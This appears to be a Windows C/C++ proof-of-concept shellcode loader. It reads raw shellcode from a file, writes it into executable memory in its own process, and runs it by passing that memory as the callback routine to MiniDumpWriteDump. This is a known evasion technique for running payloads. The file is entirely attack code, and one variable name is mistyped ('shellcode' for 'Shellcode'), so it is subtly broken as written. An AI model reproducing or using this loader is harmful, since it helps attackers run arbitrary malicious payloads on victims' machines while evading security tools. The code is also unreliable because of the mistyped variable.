BOOL ReadContents(PWSTR Filepath, PCHAR* Buffer, PDWORD BufferSize)
{
    FILE* f = NULL;
    errno_t err = _wfopen_s(&f, Filepath, L"rb");
    if (err != 0 || f == NULL)
    {
        printf("Failed to open file\n");
        return FALSE;
    }

    fseek(f, 0, SEEK_END);
    *BufferSize = ftell(f);
    fseek(f, 0, SEEK_SET);
    *Buffer = (PCHAR)malloc(*BufferSize);

    fread(*Buffer, *BufferSize, 1, f);
    fclose(f);

    return (*BufferSize != 0) ? TRUE : FALSE;
}

int MiniDump()
{
    char filepath[] = "C:\\Users\\root\\Desktop\\calc_shellcode.bin";
    BOOL Ret = FALSE;
    DWORD SCLen = 0;
    PCHAR Shellcode = NULL;
    PVOID hAlloc = NULL;


    // Convert file path to wide char string
    int len = strlen(filepath) + 1;
    int buf_len = MultiByteToWideChar(CP_ACP, 0, filepath, len, NULL, 0);
    PWSTR buf = (PWSTR)malloc(buf_len * sizeof(WCHAR));
    MultiByteToWideChar(CP_ACP, 0, filepath, len, buf, buf_len);

    // Read shellcode from file
    Ret = ReadContents(buf, &Shellcode, &SCLen);
    if (Ret == FALSE) {
        std::cerr << "Error: Failed to read content, error code " << GetLastError() << "\n";
        return 1;
    }

    std::cout << "Shellcode size: " << SCLen << "\n";

    // Get a handle to the current process
    DWORD dwProcessId = GetCurrentProcessId();
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
    if (hProcess == NULL) {
        std::cerr << "Error: Failed to open process, error code " << GetLastError() << "\n";
        return 1;
    }

    std::cout << "Process handle: " << hProcess << "\n";

    const char* szDumpPath = "mydump.dmp";
    HANDLE hDumpFile = CreateFileA(szDumpPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hDumpFile == INVALID_HANDLE_VALUE) {
        std::cerr << "Error: Failed to create minidump file, error code " << GetLastError() << "\n";
        CloseHandle(hProcess);
        return 1;
    }

    std::cout << "Dump file handle: " << hDumpFile << "\n";

    hAlloc = VirtualAllocEx(hProcess, NULL, SCLen, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (hAlloc == NULL)
    {
        std::cerr << "Failed to allocate memory for shellcode" << std::endl;
        free(Shellcode);
        return 1;
    }

    std::cout << "Memory allocated at: " << hAlloc << "\n";


    if (!WriteProcessMemory(hProcess, hAlloc, shellcode, SCLen, NULL)) {
        // handle error
        VirtualFreeEx(hProcess, hAlloc, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    MINIDUMP_CALLBACK_INFORMATION CallbackInfo;
    CallbackInfo.CallbackParam = NULL;
    CallbackInfo.CallbackRoutine = (MINIDUMP_CALLBACK_ROUTINE)hAlloc;

    BOOL bResult = MiniDumpWriteDump(hProcess, dwProcessId, hDumpFile, MiniDumpWithFullMemory, NULL, NULL, &CallbackInfo);
    if (!bResult) {
        std::cerr << "Error: Failed to write minidump, error code " << GetLastError() << "\n";
        CloseHandle(hDumpFile);
        CloseHandle(hProcess);
        return 1;
    }

    CloseHandle(hDumpFile);
    CloseHandle(hProcess);

    std::cout << "Minidump saved to " << szDumpPath << "\n";

    return 0;
}
